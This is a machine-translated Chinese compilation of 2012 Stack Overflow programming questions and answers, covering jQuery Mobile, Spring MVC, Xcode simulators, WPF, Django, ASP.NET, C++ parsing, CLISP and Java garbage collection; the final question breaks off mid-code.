> 时间：2012-07-25T14:13:40.933
> 
> 标签：jquery, jquery-mobile

我喜欢 Jquery UI（移动端）的新设计。因此，即使在一个不针对移动环境的项目上，我也希望从库中获取一些元素。

问题是 lib 需要从页面范围 ( `data-role=page`) 实例化自身，因此需要更改整个页面的十几个根样式、事件和方面。我只想要一些按钮、表单和可折叠的.. 在特定页面中。

某些行为可以在`mobileinit` [事件](http://jquerymobile.com/demos/1.1.1/docs/api/globalconfig.html)中被覆盖，但大部分行为无法停止。

**所以，问题是：**是否有一种简单的方法来实例化 jquery-mobile ui 元素或拥有一个更干净的初始页面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:21:33.783

您可以使用[JQueryMobile Download Builder [Alpha Release]](http://jquerymobile.com/download-builder/)来构建 JQM 的自定义版本。Builder 处理依赖关系。因此，您应该能够选择可以在没有and模块的情况下合并的`Widgets`and元素。`Forms``Page Creation``Page Section`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:28:00.897

根据 JQM 文档，页面结构是[约定而不是要求](http://jquerymobile.com/demos/1.1.1/docs/pages/page-anatomy.html)（滚动到底部），因此您不需要具有`div`s`data-role="page"`属性。此外，正如@NirmalPatel 提到的，您可以使用新的[下载生成器](http://jquerymobile.com/download-builder/)来下载您想要的组件。

# jquery-mobile - 没有页面刷新的jQueryMobile关闭对话框

> ID：11651764
> 
> 赞同：1
> 
> 时间：2012-07-25T14:13:57.997
> 
> 标签：jquery-mobile

我正在尝试用 jQM 对话框替换 JavaScript prompt() 函数。我的目标是提示用户输入一个字符串，然后当他们提交（提交按钮或输入）时，使用他们输入的字符串运行一个函数。

详细来说，我想取消按钮和[x]关闭对话框并返回页面，什么都不做；我希望提交按钮将#strAccount 值传递给函数。这很容易在没有表单等的情况下完成。但是，我还希望用户能够在#strAccount 字段中按回车键。我认为最简单的方法是让它成为一个表单——因此，提交和输入都会提交。

我发现我需要在提交表单时返回 false。但是，完成所有这些操作后，页面正在重新加载，这是我不想要的。

以下是一些主页内容：

```
 <div id="NewEntry" data-role="page" data-title="New Time Entry">
    <h3>Timesheet </h3>
    <a id="openDialog" data-rel="dialog">Get account name...</a>
 </div> 
```

这是对话框：

```
<div id="accountEntry" data-role="dialog">
    <div data-role="header">
        <h1>Filter by Account Name</h1>
    </div>
    <div data-role="content">
        <form id="acctNameFilter" data-rel="back" data-ajax="false">
            <p>Enter two or more letters from any part of the account name below:</p>
            <input type="text" id="strAccount" placeholder="Enter any part of account name" autocomplete="off">
            <a href="#NewEntry" data-role="button" data-rel="back" data-icon="delete" data-inline="true">Cancel</a>
            <input type="submit" data-theme="b" data-icon="check" data-inline="true" value="Submit">
        </form>
    </div>
</div> 
```

这是我的页面脚本：

```
$(document).ready(function()
{
    alert('page loading...'); //alert me if page reloads
    $('#acctNameFilter').submit(function()
    {
        alert($('#strAccount').val()); //did it get passed?
        getAcctsByString($('#strAccount').val()); //the function I want to run
        $('#strAccount').val(''); //clear out the dialog's value... (necessary?)
        $('#accountEntry').dialog('close');
        return false; //stop execution, I thought...
    });
     //#openDialog is a simple href link...
    $('#openDialog').click(function()
    {
        $.mobile.changePage('#accountEntry',{changeHash: false});
    });
} 
```

`#strAccount`另一个不太重要的问题：在对话框加载后如何设置焦点？我想尽量减少用户的压力。

提前谢谢了。

# spring - Spring 3 MVC：是否可以有一个没有“commandName”绑定的弹簧表单？

> ID：11651769
> 
> 赞同：6
> 
> 时间：2012-07-25T14:14:09.753
> 
> 标签：spring, spring-mvc

我的问题是，是否有必要为表单设置“ *commandName* ”绑定和为输入设置“*路径”绑定？*

我有一个工作流程，需要用户从一系列 ajaxy 选择框中选择数据。所以表单并不能直接映射到任何模型。仅仅为了适应这种形式而添加另一个模型似乎毫无意义，而这种形式的一切都将由 ajax 驱动。现在我知道我总是可以编写一个经典的表单并选择标签，但我想在这里利用 spring 标签，例如：

```
<form:options items="${list}" itemLabel="name" itemValue="id"/> 
```

这使我可以轻松地填充表单项。另外，我想保持项目的一致性并通过使用弹簧标签。

我想知道关于这个话题的想法和意见。

谢谢！

PS：我来自 ruby​​ on rails 背景，习惯了很多语法糖：P 如果问题听起来很愚蠢或答案很明显，请原谅我。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-25T17:10:58.647

我不知道它是否有用，但它是这样的：

如果您没有在表单中设置“commandName”，则该属性的默认值将设置为“command”。因此，如果您不设置它，则绑定的数据将具有名称“命令”。

如果需要，可以使用绑定数据的名称进行设置。

==================================================== =========================

**不使用数据绑定的解决方案是：**

我会在控制器方法中添加一个 HttpServletRequest 请求参数，并像 servlet 一样获取参数。

```
@Controller 
public class SomeController {

    @RequestMapping(value = "/formAction", method = RequestMethod.POST)
    public String controllerMethod(HttpServletRequest request){  
        // this way you get value of the input you want
        String pathValue1 = request.getParameter("path1");
        String pathValue2 = request.getParameter("path2");
        return "successfulView";
    }

} 
```

PS.：“path1”和“path2”是您在输入中设置的路径名。我知道它似乎没有正确使用 Spring，但它是 Spring 让我们使用的一个 hack。

表格是这样的：

```
<form:form method="post" action="/formAction">
    <form:input path="path1" />
    <form:input path="path2" />
    <input type="submit" value="Submit"/>
</form:form> 
```

希望它有用。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-09-20T14:01:45.507

如果我们没有将 commandName 添加到 spring 表单标签，则会引发异常
IllegalStateException：BindingResult 和普通目标对象“command”都不能作为请求参数......

# ios - 在 Mountain Lion 上将 Simulator SDK 4.3 安装到 Xcode 4.4

> ID：11651773
> 
> 赞同：58
> 
> 时间：2012-07-25T14:14:17.513
> 
> 标签：ios, xcode, ios-simulator, osx-mountain-lion

我想在山狮（os x 10.8）上的xcode 4.4中安装SDK 4.3，但是当我从xcode 4.1安装4.3 sdk包并从xcode 4.4启动模拟器时，模拟器只是告诉我ios模拟器找不到sdk。

sdk 可能需要重新安装，这意味着它无法运行！xcode 4.4 GM 有什么问题？

关于如何解决这类问题有什么想法吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-07-26T16:27:46.750

我已经调查过了，这是 Apple 的故意行为。

这是 Xcode 下载位置缓存的（已编辑）提取：

**~/Library/Caches/com.apple.dt.Xcode/Downloads/eded78df8bfabaf6560841d10cf8e53766f74f28.dvtdownloadableindex**

```
<dict>
    <key>source</key>
    <string>http://adcdownload.apple.com/ios/ios_simulator__resigned/ios_43_simulator.dmg</string>
    <key>identifier</key>
    <string>Xcode.SDK.iPhoneSimulator.4.3</string>
    <key>name</key>
    <string>iOS 4.3 Simulator</string>
    <key>userInfo</key>
    <dict>
        <key>InstalledIfAllPathsArePresent</key>
        <array>
            <string>$(DEVELOPER)/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator4.3.sdk</string>
        </array>
        <key>ActivationPredicate</key>
        <string>$MAC_OS_X_VERSION < "10.8.0"</string>
    </dict>
</dict> 
```

请注意显式的“ActivationPredicate：$MAC_OS_X_VERSION < 10.8.0”设置，该设置在其他模拟器软件包中不存在。

我试图编辑该文件，但只要 Xcode 打开它就会被另一个版本替换。而且我无法管理 4.3 Simulator DMG 的手动下载：ADG 网站抛出“会话过期”错误。

看起来 Apple 对 4.3 模拟器有问题，并决定禁用它。对于必须支持此版本的人来说，这很糟糕。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-08-08T19:13:22.607

我向 Apple 提交了 DTS，并与他们确认 Mountain Lion 不支持 iOS4 模拟器。他们建议在真实设备上进行测试。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2012-07-26T02:51:35.167

它看起来像狮子与山狮的问题。
我今天将几台机器更新到 Xcode 4.4。两个较旧的 Lion 系统提供在 xcode|preferences|downloads 下安装 iOS 4.3 和 5.0 模拟器。较新的 Mountain Lion 系统仅提供 iOS 5.0 模拟器。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2012-07-31T15:37:50.273

我也遇到过这种烦人的情况。最近，我设法添加了一个编译时检查，用于检查 API 与旧版本的 SDK。不幸的是，您无法通过模拟器使用旧版本对其进行测试，但它仍然是一些东西。

所以这就是我所做的：

我首先必须获得我想要获得的旧版 Simulator SDK。我可以通过下载包含所需 SDK的旧 Xcode **3 （不是 4）版本轻松获得此功能。**带有 iOS SDK 4.3 的 Xcode 3.2.6 链接[在这里](https://developer.apple.com/downloads/download.action?path=Developer_Tools/xcode_3.2.6_and_ios_sdk_4.3__final/xcode_3.2.6_and_ios_sdk_4.3.dmg)。

接下来我必须安装 SDK。这不是太难，所以我不会在这里解释太多。但是 SDK 存储在`Packages`文件夹中。此文件夹在早期的 Xcode 3 版本中清晰可见，但在更高版本（如 Xcode 3.2.6）中隐藏。无论如何，您都可以通过终端轻松打开它。记得安装**模拟器**SDK，而不是普通的。此外，在 Xcode 4.3 中`Developer`文件夹移动到 Xcode.app 中的更改之后，我必须将 SDK 安装到 tmp 文件夹中，然后自己将 SDK 移动到 Xcode.app 中。如果我打开它，我将需要重新启动 Xcode。

之后，我`debug`在我的项目中复制了配置，并将其命名为类似`iOS 4.3 API Check`或类似的名称 - 并不重要。然后我将这个新配置的 Base SDK 更改为我安装的旧 SDK。虽然我安装的 SDK 没有列出，所以我必须选择`other`并输入`iphonesimulator4.3`.

最后，当我需要检查旧版本的 SDK 时，我将`Run <appname>.app`项目方案中的配置更改为我的`iOS 4.3 API Check`配置。我们开始了，针对 iOS 4.3 的编译时检查。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-27T20:39:18.560

升级到 ML 后，我可以选择下载 iOS 4.3 Simulator。然而它没有用！我在调试时收到错误。当我尝试手动切换模拟器版本时，它卡住了。

如果我知道，我可能会等待解决方案，而不是升级。

# titanium - 更多选项卡内的 TableView

> ID：11651774
> 
> 赞同：0
> 
> 时间：2012-07-25T14:14:19.047
> 
> 标签：titanium, appcelerator, titanium-mobile

我有一系列标签，最后一个是“更多”标签。当您单击它时，它会为您提供一个列表或项目。当您从列表中选择某些内容时，它会打开一个带有 TableView 的窗口。表格视图行被完美填充，但由于某种原因，当您单击该行以获取详细信息时，没有任何反应。

我正在使用仅在常规选项卡中工作的完全相同的代码。为什么它在“更多”选项卡中不起作用？我搜索并找不到任何示例或任何类似问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T17:06:54.033

我猜这是为您的表格视图中的行设置事件侦听器的问题。如果您提供有关您当前如何查看每行详细信息的代码，这将有很大帮助。

鉴于提供的信息，尝试执行类似于以下的操作：

```
row.addEventListener('click', function(){
    // logic
}) 
```

# c# - 如何打印高于 0xFFFF 的字符？

> ID：11651776
> 
> 赞同：0
> 
> 时间：2012-07-25T14:14:22.057
> 
> 标签：c#, unicode, char

我想知道是否可以`0xFFFF`用 Windows 打印上面的字符？

我正在使用 Microsoft Visual Studio 2010 和 Windows XP。一个字符是 16 位宽，因此大于 的代码点`0xFFFF`不能真正适合单个字符。即使我尝试这个：

```
int codepoint = char.ConvertToUtf32(charHS, charLS); 
```

我将从代理对中获取代码点，但它仍然不适合字符。

如果我将来自较高多语言平面的字符粘贴到 C# 中的字符串中，则字符串的长度为 2。如果我尝试打印字符串，那么我将打印两个代理字符，它们不是字符，EG，没有代码点他们自己，只是作为一对，而不是“真正的”角色。

不应该有像 32 位宽的字符可以容纳高于 的代码点`0xFFFF`吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T14:18:02.807

> 不应该有像 32 位宽的字符这样可以容纳高于 0xFFFF 的代码点的东西吗？

也许。但是 Windows 对在基本多语言平面之外输出字形的支持基于 UTF-16。拆分为高低代理对并像两个字符一样传递。

# sorting - 按 HSV/HSB 排序颜色列表

> ID：11651781
> 
> 赞同：2
> 
> 时间：2012-07-25T14:14:34.940
> 
> 标签：sorting, colors, compare, hsv, hsb

我希望按 HSV/HSB 值对很长的颜色列表进行排序。我想按色调，然后是星期六，然后是明亮对它们进行排序。实际上，我需要的只是一种方法来根据 HSV 的顺序来判断一种颜色是“之前”还是“之后”，因为我只是要在 Java 中创建一个 compareTo() 并使用 TreeSet 来进行排序。在 Java 中，HSV 值都存储为浮点数。

我对这样的算法很糟糕，所以任何帮助都将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T15:05:34.260

蛮力方式：

```
public final class ColorComparator implements Comparator<Color> {
    @Override
    public int compare(Color c1, Color c2) {
        float[] hsb1 = Color.RGBtoHSB(c1.getRed(), c1.getGreen(), c1.getBlue(), null);
        float[] hsb2 = Color.RGBtoHSB(c2.getRed(), c2.getGreen(), c2.getBlue(), null);
        if (hsb1[0] < hsb2[0])
            return -1;
        if (hsb1[0] > hsb2[0])
            return 1;
        if (hsb1[1] < hsb2[1])
            return -1;
        if (hsb1[1] > hsb2[1])
            return 1;
        if (hsb1[2] < hsb2[2])
            return -1;
        if (hsb1[2] > hsb2[2])
            return 1;
        return 0;
    }
} 
```

如果您可以使用 Google Guava 库，那么一个非常简单、无需考虑的方法是：

```
public final class ColorComparator extends Ordering<Color> {
    @Override
    public int compare(Color c1, Color c2) {
        float[] hsb1 = Color.RGBtoHSB(c1.getRed(), c1.getGreen(), c1.getBlue(), null);
        float[] hsb2 = Color.RGBtoHSB(c2.getRed(), c2.getGreen(), c2.getBlue(), null);
        return ComparisonChain.start().compare(hsb1[0], hsb2[0]).compare(hsb1[1], hsb2[1])
            .compare(hsb1[2], hsb2[2]).result();
    }
} 
```

我会说只是遍历数组并比较它们（或在 Guava 中使用字典顺序），但您可能想要更改排序顺序。

# wpf - 用户控件在 TabHeader 和 Tab Content 之间

> ID：11651784
> 
> 赞同：0
> 
> 时间：2012-07-25T14:14:40.760
> 
> 标签：wpf

我不知道我正在尝试做的事情是否可能......

但是我正在尝试`UserControl`在`TabHeader`and之间添加 a `TabContent`，但我无法将 Margin 设置为我想要的那么多。

这是`Styler`我全部应用的`Tab-Control`

```
 <Style x:Key="TabItemStyle" TargetType="{x:Type TabItem}">
        <Setter Property="FontFamily" Value="Trebuchet MS"/>
        <Setter Property="FontSize" Value="13"/>
        <Setter Property="Foreground" Value="#FFFFFFFF"/>
        <Setter Property="Header" Value="{Binding Content.DataContext.HeaderInfo, RelativeSource={RelativeSource Self}}"  />
        <Setter Property="Template">
            <Setter.Value>
                <ControlTemplate TargetType="{x:Type TabItem}">
                    <Grid Width="Auto" Height="Auto" x:Name="TabItemRoot" Margin="10,0,5,0">
                        <ContentPresenter Margin="10,5,0,5" x:Name="Content" ContentSource="Header" RecognizesAccessKey="True"/>
                        <Border x:Name="border" Height="Auto" Padding="0,0,0,0" Opacity="0">
                            <Border.Background>
                                <RadialGradientBrush>
                                    <GradientStop Color="#A3FFFFFF" Offset="0"/>
                                    <GradientStop Color="#00FFFFFF" Offset="1"/>
                                </RadialGradientBrush>
                            </Border.Background>
                        </Border>
                    </Grid>
                    <ControlTemplate.Triggers>
                        <Trigger Property="IsSelected" Value="true">
                            <Setter TargetName="border" Property="Opacity" Value="1"/>
                            <Setter TargetName="Content" Property="Opacity" Value="1"/>
                        </Trigger>
                        <Trigger Property="IsSelected" Value="false">
                            <Setter TargetName="Content" Property="Opacity" Value="0.5"/>
                        </Trigger>
                    </ControlTemplate.Triggers>
                </ControlTemplate>
            </Setter.Value>
        </Setter>
</Style> 
```

每当我设置边距时，它会移动其中的内容，但不会移动控件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:30:06.120

您可能希望为 TabControl 定义 ControlTemplate，而不仅仅是为具有以下内容的项目定义：

```
 <TabControl>
        <TabControl.Style>
            <Style TargetType="TabControl">
                <Setter Property="Template">
                    <Setter.Value>
                        <ControlTemplate TargetType="TabControl">
                            <StackPanel>
                                <TabPanel IsItemsHost="True" />
                                <Border Margin="10" BorderBrush="Blue" Background="Green" Width="100" Height="100" />
                                <ContentPresenter ContentSource="SelectedContent" />
                            </StackPanel>
                        </ControlTemplate>
                    </Setter.Value>
                </Setter>
            </Style>
        </TabControl.Style> 
```

**编辑：** 我仍然没有真正得到你想要做的事情，但是要在 TabHeader 和 TabContent 之间放置任何东西，你可以想出类似这样的东西作为 TabItems 的模板：

```
<ControlTemplate TargetType="TabItem">
    <Border BorderBrush="Black" BorderThickness="5">
        <Grid>
            <Grid.RowDefinitions>
                <RowDefinition />
                <RowDefinition />
            </Grid.RowDefinitions>

            <ContentPresenter ContentSource="Header" Grid.Row="0" />

            <TextBlock Grid.Row="1">Usercontrol goes here</TextBlock>
        </Grid>
    </Border>
</ControlTemplate> 
```

# html - 如何在 Body Tag 中使用 CSS 强制将 html 内容包装为固定宽度？

> ID：11651787
> 
> 赞同：3
> 
> 时间：2012-07-25T14:14:42.867
> 
> 标签：html, css, internet-explorer, fixed-width

在我的 HTML 文档中，我想强制执行固定布局（250 像素宽度）。

请您帮我提供一个可以在 body 标记中使用的 CSS 片段，以便 html 内容将在固定宽度后包装？

例如，

```
<body style="width: 250px"> 
```

此代码段在 Firefox 中完美运行，但在 Internet Explorer 中无法运行。是否有任何通用技术可以强制所有浏览器的固定宽度？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:16:46.640

如果您在 Quirks 模式下使用它，它将无法在 IE 中运行。确保你有一个`<!DOCTYPE>`，它应该可以正常工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T16:08:36.253

适用于所有支持 CSS 的浏览器（甚至是旧版本的 IE）的技术是引入中间标记，例如`<body><div id="body">...</div></body>`，并设置该元素的宽度，例如`#body { width: 250px; }`。

在 Quirks 模式下，IE 将`body`元素视为根元素，因此显然会忽略其上的`width`属性等。

# c# - 使用 msmq 出现错误“必须解决以下错误”

> ID：11651788
> 
> 赞同：4
> 
> 时间：2012-07-25T14:14:45.690
> 
> 标签：c#, visual-studio, msmq

我在 VS 2012 RC 中工作。

我有一个继承自`MessageQueue`（添加对 System.Messaging.dll 的引用）的类。当我想在解决方案资源管理器中打开它时，我看到以下错误：

```
To prevent possible data loss before loading the designer, the following 
errors must be resolved: "Format name is invalid. " 
```

项目构建。仅当我双击打开课程时才会发生这种情况。当我单击左键并单击“打开”时，不会发生此错误。

`: MessageQueue`当我从下面的代码中删除时，问题就解决了。

代码：

```
public class QueueMSMQ : MessageQueue
{
  //my own class
} 
```

错误是什么意思，发生了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T07:36:51.223

由于 System.Messaging.MessageQueue 继承自 Component 类，因此您的子类将被视为 Component 并使用 Form Editor 作为默认编辑器。要解决此问题，您可以右键单击此类，选择打开方式，在打开方式对话框中将 Microsoft Visual Studio 编辑器设置为默认编辑器。您可以在此处找到更多详细信息：[msdn](http://social.msdn.microsoft.com/Forums/en-US/winformsdesigner/thread/93cb9a43-3399-459d-bd1e-bcda2156d30d/)

# python - 保存后编辑 Django 模型

> ID：11651789
> 
> 赞同：2
> 
> 时间：2012-07-25T14:14:47.003
> 
> 标签：python, django

我有以下代码：

模型.py

```
class TelefoneIP(models.Model):
        mac = models.CharField(max_length=12, help_text="Este campo deve ter 12 digitos")
        modelo = models.ForeignKey(ModeloTelefoneIP)
        cliente_atual = models.ForeignKey(Cliente)
        fornecedor = models.ForeignKey(Fornecedor)
        datacompra = models.DateField(verbose_name="Data de compra", null=True, blank=True)
        nfcompra = models.IntegerField(verbose_name="Nota fiscal de compra")

class MovimetoTelefoneIP(models.Model):
        equipamento = models.ForeignKey(TelefoneIP)
        cliente = models.ForeignKey(Cliente)
        nfvenda = models.IntegerField(verbose_name="Nota fiscal de saída", null=True, blank=True)
        datavenda = models.DateField(verbose_name="Data de saída", null=True, blank=True) 
```

管理员.py：

```
class TelefoneIPInline(admin.StackedInline):
        model = MovimetoTelefoneIP
        extra = 1
        list_filter = ['nome']

class TelefoneIPAdmin(admin.ModelAdmin):
        list_display = ('mac', 'modelo', 'fornecedor', )
        list_filter = ['cliente_atual__nome']
        search_fields = ['mac']
        inlines = [TelefoneIPInline] 
```

问题是，当我编辑内联时，我可以在保存时将 cliente_atual（在 TelefoneIP 上）的值设置为 cliente（在 MovimentoTelefoneIP 上）吗？

谢谢。

PS：我在 MovimentoTelefoneIP 中输入了此代码，但也没有用。字段 cliente_atual 已更新，但内联数据未保存。我也尝试了 Hassek 的代码，但什么也没有。

```
 def save(self, *args, **kwargs):
            MovimetoTelefoneIP.save()
            equipamento = self.equipamento
            equipamento.cliente_atual = self.cliente
            equipamento.save() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:38:32.913

是的，您必须覆盖表单中的保存并将该表单添加到管理员：

```
class TelefoneIpForm(forms.ModelForm):
    class Meta:
        model = TelefoneIp

    def save(self, commit=True):
        instance = super(TelefoneIpForm, self).save(commit=commit)         

        equipamento = instance.equipamento
        equipamento.cliente = instance.cliente_atual
        equipamento.save()

class TelefoneIPAdmin(admin.ModelAdmin):
    list_display = ('mac', 'modelo', 'fornecedor', )
    list_filter = ['cliente_atual__nome']
    search_fields = ['mac']
    inlines = [TelefoneIPInline]
    form = TelefoneIpForm 
```

我没有测试代码，所以如果无法像代码中显示的那样访问信息，只需检查使用**pdb调试它的对象**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-27T19:08:05.697

我找到了另一种逻辑方法来解决我的问题。但我仍然有疑问：[Access data from a related class in Django](https://stackoverflow.com/questions/11693635/access-data-from-a-related-class-in-django/)

# android - 以编程方式将完成按钮添加到 Android MediaController 子类

> ID：11651790
> 
> 赞同：1
> 
> 时间：2012-07-25T14:14:47.623
> 
> 标签：android, button, mediacontroller

我想将完成按钮添加到 MediaController 子类。这是我到目前为止所尝试的：

```
 private class MediaControllerWithDoneButton extends MediaController {

        public MediaControllerWithDoneButton(android.content.Context context) {
            super(context);

            Button doneButton = new Button(this);
        }
    } 
```

我收到一个错误，因为没有将实例作为参数的`Button`构造函数。`MediaController`由于我是 Android 和 Java 的新手，我可以使用一些帮助来了解如何继续。

**更多信息：**上述错误已解决。现在我想知道布局。特别是如何确保 Done 按钮与默认的播放/暂停、倒带和快进 MediaController 按钮完美匹配。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:19:42.993

替换`this`为`MyActivity.this`（不是字面上的“MyActivity”，而是无论您的活动名称是什么。所以在您的情况下，`MediaControllerWithDoneButton.this`）。

# asp.net - 将列表（字符串）绑定到中继器

> ID：11651804
> 
> 赞同：7
> 
> 时间：2012-07-25T14:15:32.963
> 
> 标签：asp.net, vb.net, arraylist

如何将简单的字符串列表绑定到中继器？

```
Protected Sub Page_Load(sender As Object, e As System.EventArgs)

    'create sample data:
    Dim photos As New List(Of String)
    photos.Add("large1.jpeg")
    photos.Add("large2.jpeg")
    photos.Add("large3.jpeg")
    photos.Add("large4.jpeg")
    photos.Add("large5.jpeg")

    'bind data:
    Repeater1.DataSource = photos
    Repeater1.DataBind()

End Sub 
```

HTML 很简单：

```
 <asp:Repeater ID="Repeater1" runat="server" ClientIDMode="Predictable">
            <HeaderTemplate><ul></HeaderTemplate>
            <FooterTemplate></ul></FooterTemplate>
            <SeparatorTemplate>
                <li>
                    <asp:Image ID="img_photo" runat="server" ImageUrl="<%# Container.DataItem %>" /></li>
            </SeparatorTemplate>
        </asp:Repeater> 
```

Container.DataItem 的值始终为空。

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T14:23:14.763

更改`<SeparatorTemplate>`为`<ItemTemplate>`它应该可以工作！

SeparatorTemplate 没有 DataItem。分隔符在两个项目之间，总是有 n-1 个分隔符，所以如果数据绑定确实有效，它总是会留下最后一个项目未使用。

# c# - Windows 7 上的 WinForms 背景颜色

> ID：11651809
> 
> 赞同：3
> 
> 时间：2012-07-25T14:15:50.120
> 
> 标签：c#, .net, winforms, c#-4.0

我有一个 .Net 应用程序，其中包含一个显示为对话框的表单。这在 Windows XP 上效果很好，但是当我在 Windows 7 上运行这个 EXE 时，表单背景颜色变为黑色。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-25T14:24:12.093

ActiveCaptionText 在 Windows 7 中确实会显示为黑色，这是标准行为。在 Windows XP 上，ActiveCaptionText 显示为白色，如下所示：

![活动标题文本](../Images/ea980759589c5eb5ce6726807398a548.png)

我认为您需要更改 BackColor 属性以`Control`使您的表单看起来像您想要的那样：

![控制](../Images/a490f8277af4fef5c5fd3b3fff2f00c2.png)

# c++ - c++ istringstream

> ID：11651810
> 
> 赞同：0
> 
> 时间：2012-07-25T14:15:51.743
> 
> 标签：c++, parsing, istringstream

我正在尝试编写一个 c++ opengl 应用程序来加载 .OBJ 文件，我使用此代码来读取顶点：

```
char buf[256];
while(!objFile.eof())
{
    objFile.getline(buf,256);
    coordinates.push_back(new std::string(buf));
}

else if ((*coordinates[i])[0]=='v' && (*coordinates[i])[1]==' ')
{
    float tmpx,tmpy,tmpz;
    sscanf(coord[i]->c_str(),"v %f %f %f",&tmpx,&tmpy,&tmpz);
    vertex.push_back(new coordinate(tmpx,tmpy,tmpz));
    cout << "v " << tmpx << " " << tmpy << " " << tmpz << endl;
} 
```

所以基本上第二段代码会解析 obj 文件中的顶点行

```
v 1.457272 0.282729 -0.929271 
```

我的问题是如何使用`istringstream` 下面的代码在 c++ 语法中的转换来解析这个顶点线 c++ 样式

```
sscanf(coord[i]->c_str(),"v %f %f %f",&tmpx,&tmpy,&tmpz);
    vertex.push_back(new coordinate(tmpx,tmpy,tmpz)); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:22:33.370

如果您确定前 2 个字符无用：

```
istringstream strm(*coord[i]);
strm.ignore(2);
strm >> tmpx >> tmpy >> tmpz;
vertex.push_back(new coordinate(tmpx, tmpy, tmpz)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:23:24.657

它就像从标准输入中读取一样工作：

```
istringstream parser(coord[i]);
char tmp;
parser >> tmp >> tmpx >> tmpy >> tmpz; 
```

（注意：`tmp`只是在行首吃'v'并且可以忽略 - 或者在初始化流之前/同时将其剪掉）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:21:13.443

见[这里](http://www.cplusplus.com/reference/iostream/istringstream/istringstream/)。这是一个很好的例子。使用它来调整您的代码

# x++ - X++ 中的 group by 子句

> ID：11651811
> 
> 赞同：1
> 
> 时间：2012-07-25T14:15:53.573
> 
> 标签：x++, microsoft-dynamics, ax

另一个奇怪的问题，是否可以在 X++ 中的 group by 子句中指定表达式？基本上，我该怎么做：

```
while select InventDim **group by substr(InventDim.inventBatchId,1,3)**
join InventDimId from InventTrans
where InventTrans.inventDimId == Inventdim.inventDimId && InventTrans.ItemId == _itemId
{
MyQty += inventTrans.Qty
} 
```

谢谢你的帮助问候，托马斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-26T11:46:17.717

不，这是不可能的 - 请参阅[Select Statement Syntax](http://msdn.microsoft.com/en-us/library/aa656402.aspx)以了解什么是允许的，什么是不允许的。您必须使用一些解决方法，通常是在不分组的情况下获取数据并通过应用程序代码处理它们。

# sharepoint-2010 - SharePoint 2010 Lotus Domino SSO

> ID：11651812
> 
> 赞同：1
> 
> 时间：2012-07-25T14:15:55.237
> 
> 标签：sharepoint-2010, single-sign-on

我即将接近一个新的大型项目，以引入 SP 2010 标准来替换现有的 Intranet 门户......而且我必须进行可行性研究......

访问门户的用户在 Active Directory 和 Lotus Domino 中进行调查，当用户单击门户中显示的链接时......在 SSO 模式下，他们可以打开一些 Lotus 应用程序（使用 ltpa 令牌）。

所以....在这美丽的环境中我不得不介绍SP2010！：-/

我有一些问题...

1.  使用 Claims auth + FIM (ForeFront Identity Manager) + User profile serivces 来允许 SP 2010 映射超过 1 个身份提供者是否正确？（在本例中是 AD 和 Lotus Domino）

2.  根据您的经验....如何尝试将 SSO 从 SP 页面...复制到 Lotus 应用程序？

谢谢！！！:)

# lisp - lisp，如何消除重启

> ID：11651818
> 
> 赞同：0
> 
> 时间：2012-07-25T14:16:21.870
> 
> 标签：lisp, common-lisp, clisp

我对 lisp 很陌生。当我在 clisp 环境中玩时，我经常犯错误，但随后立即被一长串惩罚，例如

```
ABORT          :R11     Abort debug loop
ABORT          :R12     Abort debug loop
ABORT          :R13     Abort debug loop
ABORT          :R14     Abort debug loop
ABORT          :R15     Abort debug loop 
```

这只是破坏了我的屏幕，我看不到任何以前的命令。有谁知道如何消除这个提示？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T16:07:22.753

发生这种情况是因为您一直在遇到错误，进入调试器并继续工作，堆积嵌套的调试器。完成检查错误后，您应该选择适当的重新启动来结束调试。我不记得 CLISP 中的快速击键是什么，但大概笑话者的答案就是这样。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-15T19:14:06.423

除了所有其他出色的答案之外，这里还有[一种避免登陆调试器](http://www.clisp.org/impnotes/restarts.html#global-handler)的方法（a la scheme）：

```
(set-global-handler 'error 'sys::abortonerror) 
```

**不**建议这样做，而是学习[调试器](http://www.clisp.org/impnotes/repl.html)！

例如，用于`:q`从所有调试器逃逸到顶级 REPL。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T15:09:25.770

在`gnu clisp`和linux中，你可以使用`ctrl-D`它离开并返回

如果您使用的是 windows 版本并且不起作用，请尝试`ctrl-Z <enter>`\

顺便说一句，许多交互式口译员可以理解这一点。

# java - 为什么 Java System.gc() 不能按预期工作？

> ID：11651820
> 
> 赞同：3
> 
> 时间：2012-07-25T14:16:23.770
> 
> 标签：java, memory-management, garbage-collection

我有以下两个函数，一个是 insert()，另一个是 startGC()。

我将首先调用 insert() 方法，这将占用大约 300MB 的堆空间。之后我将调用 startGC() ，它应该释放在堆中分配的内存，因为所有向量对象都是函数本地的，但它没有发生。

```
private void insert()
 {
         Vector v=new Vector();
